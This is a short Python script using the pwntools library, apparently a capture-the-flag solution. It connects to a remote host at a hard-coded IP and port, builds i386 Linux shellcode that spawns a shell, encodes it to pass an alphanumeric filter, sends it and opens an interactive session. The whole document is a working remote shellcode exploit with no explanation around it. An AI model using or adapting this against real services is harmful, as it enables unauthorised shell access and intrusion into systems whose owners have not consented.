from pwn import *
context(arch = 'i386', os = 'linux')
r = remote('155.69.144.206', 22805)
cmd = asm(shellcraft.sh())
# encoder.re_alphanumeric = r'[^A-Z0-9]'
encoded = pwnlib.encoders.encode(cmd, expr=r'[^A-Z0-9]')
print(cmd)
print(encoded)
r.send(encoded)
r.interactive()
